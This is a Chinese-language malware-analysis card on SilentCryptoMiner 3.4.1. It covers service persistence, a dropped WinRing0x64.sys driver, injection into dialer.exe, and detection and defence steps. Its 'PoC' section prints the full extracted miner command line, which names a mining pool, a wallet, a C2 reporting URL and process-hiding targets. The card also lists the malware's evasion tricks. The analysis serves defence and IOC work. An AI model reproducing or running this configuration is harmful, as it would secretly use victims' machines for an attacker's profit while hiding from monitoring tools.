---
id: code-analysis-reverse-windows-silentcryptominer-service-injection-winring0
title: SilentCryptoMiner 3.4.1 持久化与驱动面：随机服务 LDQRSTKE 自启动 + 释放 WinRing0x64.sys + 明文挖矿配置提取（dialer.exe 注入隐藏见关联卡）
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: silentcryptominer-service-winring0-dialer-injection-config
tags:
- silentcryptominer
- xmrig
- cryptominer
- winring0
- process-injection
- rootkit
- persistence
- config-extraction
- malware-analysis
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V281
  verified_at: '2026-11-08T05:26:51+08:00'
  notes: 已对照原文与图18-24核对：图19 LDQRSTKE 服务 Auto start、LocalSystem、二进制 C:\ProgramData\bjvvxgbjmpij\npldfzxzkixc.exe；图20 C:\Windows\Temp\edcchowqigmf.sys 15KB；图21 xmrig-6.21.3 包内 WinRing0x64.sys 14.20KB；图22 dialer.exe x2、hrd895A.tmp UPX、PAGE_EXECUTE_READ MEM_PRIVATE；图24 矿池钱包统计；明文 --cinit-* 配置与原文一致。卡内持久化+驱动+明文配置的原子与既有 3.2.0 注入卡（dialer.exe 注入/XOR/互斥量）不同，注入隐藏已引用既有卡。未执行样本。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-silentcryptominer-service-injection-winring0/
draft: false
kb_aliases:
- SilentCryptoMiner 分析
- xmrig WinRing0x64.sys
- dialer.exe 注入
- stealth-targets 进程隐藏
- cinit-api 挖矿配置
- SilentCryptoMiner 3.4.1
---

## 一句话结论

SilentCryptoMiner 3.4.1 样本的持久化与驱动面可直接从样本还原：把自身复制到 `C:\ProgramData\<随机目录>\<随机名>.exe` 并注册 `LDQRSTKE` 服务以 LocalSystem 自启动，向 `C:\Windows\Temp` 释放 xmrig 自带的 `WinRing0x64.sys`（命令行 `--cinit-winring=edcchowqigmf.sys`），同时把矿池、钱包、`stealth-targets`、API 地址等完整挖矿配置以明文命令行保存，连接 `zeph.2miners.com:2222` 挖 Zephyr 并通过 `http://51.77.140.74/api/endpoint.php` 上报；注入 `dialer.exe` 与 rootkit 隐藏的载荷链见既有卡。

## 原理

- **开源挖矿 builder**：样本是 `UnamSanctam/SilentCryptoMiner`（目前已下架）生成的客户端，builder 把矿池、钱包、注入进程、启动方式、stealth 目标、API 地址等配置编译进客户端；因此配置字符串在样本中可直接提取。
- **服务持久化**：样本复制到 `C:\ProgramData\bjvvxgbjmpij\npldfzxzkixc.exe`，创建 `LDQRSTKE` 服务，启动类型 Auto、账户 LocalSystem、二进制路径指向复制后的 EXE；服务随系统启动，权限为 SYSTEM。
- **WinRing0 驱动**：向 `C:\Windows\Temp\edcchowqigmf.sys` 释放的驱动与 xmrig 6.21.3 包内的 `WinRing0x64.sys` 一致（哈希/大小对比），是 xmrig 用于读取 MSR、支持 RandomX 的签名驱动；命令行中的 `--cinit-winring=edcchowqigmf.sys`、`--randomx-no-rdmsr` 说明挖矿载荷会加载该驱动。
- **进程注入与隐藏**：样本启动 `dialer.exe`（Microsoft 电话拨号程序，常见合法宿主），把 UPX 加壳的挖矿载荷注入其内存（出现 `PAGE_EXECUTE_READ`、`MEM_PRIVATE` 的可执行区域）；`stealth-targets=Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe` 让 rootkit 在这些进程枚举时隐藏注入进程，普通任务管理器/Process Hacker 看不到异常。
- **挖矿配置**：`--algo=rx/0`、`--url=zeph.2miners.com:2222`、钱包地址、`--cpu-max-threads-hint=20`、`--cinit-idle-wait=5`、`--cinit-idle-cpu=80`、`--cinit-api=http://51.77.140.74/api/endpoint.php`、`--cinit-version=3.4.1`、`--cinit-id=...`；空闲/CPU 阈值用于降低被用户察觉的概率。
- **为什么可静态提取**：builder 生成的客户端把完整命令行/配置以字符串形式保存，字符串搜索 `--url=`、`--cinit-`、`dialer.exe` 即可拿到矿池、钱包、API 与注入目标。

## 触发条件

- Windows 主机执行了该挖矿样本（通常已取得管理员权限，才能创建 LocalSystem 服务与加载驱动）。
- 系统允许加载未在禁止列表中的签名驱动（WinRing0x64.sys 为合法签名但常被滥用）。
- 主机可出网访问矿池 `zeph.2miners.com:2222` 与 API 地址；CPU 资源可被长期占用。
- 分析环境有样本与 xmrig 6.21.3 原始包用于哈希对比（或已知 WinRing0x64.sys 哈希库）。

## 利用步骤

1. 用 strings/FLOSS/dnSpy 打开样本，搜索 `--url=`、`--cinit-`、`dialer.exe`、`SilentCryptoMiner`，提取完整挖矿命令行与 API 地址。
2. 检查持久化：`sc qc <服务名>`/注册表 `HKLM\SYSTEM\CurrentControlSet\Services`，确认服务二进制指向 `C:\ProgramData\<随机目录>\<随机名>.exe`，启动账户 LocalSystem。
3. 检查释放文件：`C:\Windows\Temp` 下随机名 `.sys`，与 xmrig 包内 `WinRing0x64.sys` 做哈希/大小对比；确认命令行 `--cinit-winring=` 指向该文件。
4. 检查进程：`dialer.exe` 是否存在多个实例、是否有 `PAGE_EXECUTE_READ`/`MEM_PRIVATE` 的可执行内存区域、模块是否含 UPX 特征；用 Process Hacker/火绒剑对照 stealth-targets 是否被隐藏。
5. 提取矿池/钱包/API 配置，查询钱包余额与矿池 worker 信息，确认挖矿收益归属。
6. 输出 IOC：服务名、落地路径、驱动文件名/哈希、注入宿主、矿池/钱包/API 地址。

## PoC

```text
# 原文提取的 SilentCryptoMiner 配置（关键片段）
dialer.exe --algo=rx/0 --url=zeph.2miners.com:2222 --user=ZEPHYR2CLWQJrcoTC34ZFxUhj3zHM6SXRL9rCJUoFpLsJgn2FQBiG5uYJD64vAodJNYiaGFjUpUEFUEZLYPjxgDm3AoF7ig3UiC1D.RIG --pass=x --cpu-max-threads-hint=20 --cinit-winring=edcchowqigmf.sys --randomx-no-rdmsr --cinit-stealth-targets=Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe --cinit-stealth-fullscreen --cinit-api=http://51.77.140.74/api/endpoint.php --cinit-version=3.4.1 --cinit-idle-wait=5 --cinit-idle-cpu=80 --cinit-id=jrnfypllqlwghdvf
```

```text
# 落地与持久化
C:\ProgramData\bjvvxgbjmpij\npldfzxzkixc.exe      # 样本副本（服务二进制）
服务名: LDQRSTKE   启动类型: Auto   账户: LocalSystem
C:\Windows\Temp\edcchowqigmf.sys                   # WinRing0x64.sys（xmrig 6.21.3 自带）
宿主进程: dialer.exe（注入 UPX 加壳载荷）
```

## 变体与关联

- 变体：builder 可改注入宿主（默认可选 `RegAsm.exe`、`MSBuild.exe` 等）、启动方式（计划任务/注册表 Run）、矿池与算法；配置字段名 `--cinit-*` 是 SilentCryptoMiner 的稳定特征。
- 变体：无管理员权限时可能只做用户级启动与进程注入，不创建服务/不释放驱动；此时以 `dialer.exe` 注入与矿池外联为主要检测点。
- 关联：Go 挖矿样本的配置提取见 `[[defense-forensics-go-miner-heap-msgpack-field-extraction]]`；BlackNET 僵尸网络的 C2/传播能力见 `[[code-analysis-reverse-windows-blacknet-config-aes-pbkdf2-extract]]`、`[[defense-detection-blacknet-http-c2-heartbeat-traffic]]`；本样本与 Quasar RAT 同批投递，投递链见 `[[pentest-initial-access-lol-cheat-video-sfx-vbs-quasar-rat]]`。
- 边界：矿池/API 下线、驱动被禁止加载、`dialer.exe` 被禁用或注入被 EDR 拦截时，挖矿不生效；但服务与文件落地仍可被取证。

## 检测与防御

- 检测：`C:\ProgramData\<随机目录>\<随机名>.exe` 注册的随机服务名（如 `LDQRSTKE`）；`C:\Windows\Temp` 下随机名 `.sys` 且哈希等于 WinRing0x64.sys；`dialer.exe` 出现异常可执行内存/UPX 特征；命令行含 `--cinit-`、`--url=`、`rx/0`；外联 `*.2miners.com:2222` 或 `api/endpoint.php`。
- 防御：禁止加载 WinRing0/WinRing0x64 等已知可滥用驱动（WDAC/驱动黑名单）；限制普通用户创建服务；EDR 监控进程注入与 `dialer.exe` 子进程；网络侧阻断矿池域名/端口与已知 API。
- 治理：把 SilentCryptoMiner 配置字段/services/文件路径加入狩猎规则；对同时出现 RAT 与矿机的样本按同一攻击活动处置，避免只清矿机留下 RAT。
